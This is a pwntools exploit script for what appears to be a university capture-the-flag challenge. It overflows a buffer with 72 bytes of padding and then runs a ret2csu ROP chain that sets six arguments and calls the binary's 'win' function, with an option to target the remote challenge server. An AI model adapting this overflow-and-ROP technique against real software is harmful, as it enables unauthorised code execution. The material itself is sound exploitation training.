#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2csu-1.chals.io", 443, ssl=True, sni="cse4850-ret2csu-1.chals.io")
    else:
        return process(binary)

def exploit(p,e,r):
    pad = b'A' * 72

    arg1 = p64(0xbe)
    arg2 = p64(0xb01d)
    arg3 = p64(0xface)
    arg4 = p64(0xbad)
    arg5 = p64(0xd0)
    arg6 = p64(0xc4a53)

    win_plt = p64(e.plt['win'])
    writable_mem = p64(0x601038)

    pop_rdi = p64(r.find_gadget(['pop rdi', 'ret'])[0])
    pop_rsi_r15 = p64(r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
    ret = p64(r.find_gadget(['ret'])[0])

    pop_rbx_rbp_r12_5 = p64(0x40095a)
    mov_rdx_r15_call_r12 = p64(0x400940)
    pop_r12_r15 = p64(0x40095c)

    chain = pop_rbx_rbp_r12_5 + p64(0) + p64(1) + p64(0x600e48) + arg1 + arg2 + arg3
    chain += mov_rdx_r15_call_r12 + p64(0) * 7
    chain += pop_r12_r15 + arg4 + arg5 + arg6 + p64(0) 
    chain += ret + pop_rdi + arg1 + win_plt


    p.sendline(pad + chain)
    p.interactive()


if __name__=="__main__":
    file = './chal.bin'
    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
